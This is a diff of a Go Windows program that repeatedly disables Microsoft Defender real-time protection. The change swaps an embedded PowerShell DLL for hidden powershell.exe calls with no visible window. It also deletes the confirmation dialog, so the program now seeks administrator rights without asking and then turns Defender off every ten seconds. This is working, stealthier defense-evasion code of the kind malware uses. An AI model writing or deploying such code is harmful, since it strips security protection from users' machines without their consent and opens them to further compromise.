@@ -2,16 +2,16 @@ package main
 
 import (
 	_ "embed"
+	"encoding/json"
 	"fmt"
 	"log"
 	"os"
-	"path/filepath"
+	"os/exec"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 
-	"github.com/KnicKnic/go-powershell/pkg/powershell"
 	"golang.org/x/sys/windows"
 )
 
@@ -27,9 +27,6 @@ func CheckErr(err error) {
 		log.Fatal(err)
 	}
 }
-
-//go:embed psh_host.dll
-var psDll []byte
 
 func IsAdmin() bool {
 	var sid *windows.SID
@@ -101,38 +98,17 @@ func RerunElevated() {
 		fmt.Println(err)
 	}
 }
-func Elevate() bool {
-	res := MessageBoxPlain("Permissions", "Do you need admin permissions")
-	return res == 6
-}
-func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
-	ret, _, _ := user32.MustFindProc("MessageBoxW").Call(
-		uintptr(hwnd),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
-		uintptr(flags))
 
-	return int(ret)
-}
-
-// MessageBoxPlain of Win32 API.
-func MessageBoxPlain(title, caption string) int {
-	const (
-		NULL     = 0
-		MB_OK    = 0
-		MB_YESNO = 4
-	)
-	return MessageBox(NULL, caption, title, MB_YESNO)
-}
-func IsDefenderRunning(runspace powershell.Runspace) bool {
+func IsDefenderRunning() bool {
 	script := `Get-MpComputerStatus | ConvertTo-Json`
-	results1 := runspace.ExecScript(script, false, nil)
-	defer results1.Close()
+	cmd := exec.Command("powershell.exe", "-C", script)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	result, err := cmd.Output()
 
-	if results1.Success() && len(results1.Objects) > 0 {
+	if err == nil {
 		var values map[string]interface{}
 
-		err := results1.Objects[0].JSONUnmarshal(&values)
+		err := json.Unmarshal(result, &values)
 		if err == nil {
 			stat, f := values["RealTimeProtectionEnabled"]
 			if f {
@@ -145,16 +121,17 @@ func IsDefenderRunning(runspace powershell.Runspace) bool {
 
 	return false
 }
-func DisableDefender(runspace powershell.Runspace, disable bool) bool {
+func DisableDefender(disable bool) bool {
 	state := "true"
 	if !disable {
 		state = "false"
 	}
 	script := fmt.Sprintf(`Set-MpPreference -DisableRealtimeMonitoring $%s`, state)
-	results1 := runspace.ExecScript(script, false, nil)
-	defer results1.Close()
+	cmd := exec.Command("powershell.exe", "-C", script)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	_, err := cmd.Output()
 
-	return results1.Success()
+	return err == nil
 }
 func WriteFile(path string, data []byte) error {
 	f, err := os.OpenFile(path, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0755)
@@ -179,18 +156,13 @@ func Exists(path string) bool {
 	return !os.IsNotExist(err)
 }
 func Start() {
-	exe, _ := os.Executable()
-	dll := filepath.Join(filepath.Dir(exe), "psh_host.dll")
-	if !Exists(dll) {
-		WriteFile(dll, psDll)
-	}
-	runspace := powershell.CreateRunspaceSimple()
-	// auto cleanup your runspace
-	defer runspace.Close()
-	for true {
-		if IsDefenderRunning(runspace) {
-			DisableDefender(runspace, true)
+
+	for {
+
+		if IsDefenderRunning() {
+			DisableDefender(true)
 		}
+
 		time.Sleep(time.Second * 10)
 	}
 
@@ -201,10 +173,8 @@ func main() {
 	}
 	if FirstInstance() {
 		if !IsAdmin() {
-			if Elevate() {
-				RerunElevated()
-				os.Exit(0)
-			}
+			RerunElevated()
+			os.Exit(0)
 		}
 		Start()
 
